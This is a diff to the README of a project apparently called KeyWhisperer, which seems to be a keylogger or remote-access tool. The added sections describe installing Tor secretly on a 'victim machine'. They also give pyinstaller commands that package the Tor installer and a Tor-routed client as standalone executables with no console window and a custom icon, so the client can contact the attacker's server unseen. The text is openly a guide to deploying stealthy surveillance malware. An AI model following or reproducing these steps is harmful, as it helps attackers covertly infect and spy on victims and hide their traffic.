@@ -121,7 +121,27 @@ The hostname of your hidden service will be in '/var/lib/tor/hidden_service/host
 ```
 sudo cat /var/lib/tor/hidden_service/hostname
 ```
-Save this onion address because it will be used in the next in the [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/tor_client.py)
+Save this onion address because it will be used in the next step.
+<br><br><br>
+
+## Install TOR secretly on victim machine
+This [install_tor script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) will secretly download, extract, and configure Tor without installing it as a service on the victim machine.
+Run the following command to convert your [install_tor script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) into a standalone executable:
+```
+pyinstaller --onefile --noconsole --icon=icon.ico install_tor.py
+```
+
+**Note:** This script can only be used on a windows machine.
+<br><br><br>
+
+## TOR Client Script
+You will have to use this [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/tor_client.py) instead of the [client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/client.py) we used before, if you want to enable the commnication of server and client via tor network.
+Run the following command to convert your [tor_client script](https://github.com/BlurryFace04/KeyWhisperer/edit/main/install_tor.py) into a standalone executable:
+```
+pyinstaller --onefile --noconsole --icon=icon.ico tor_client.py
+```
+**Note:** You can keep using the same server script even for communication via tor.
+<br><br><br>
 
 ## Bugs, Issues and Contributing
 If you find bugs or have suggestions about improving the module, don't hesitate to contact me.
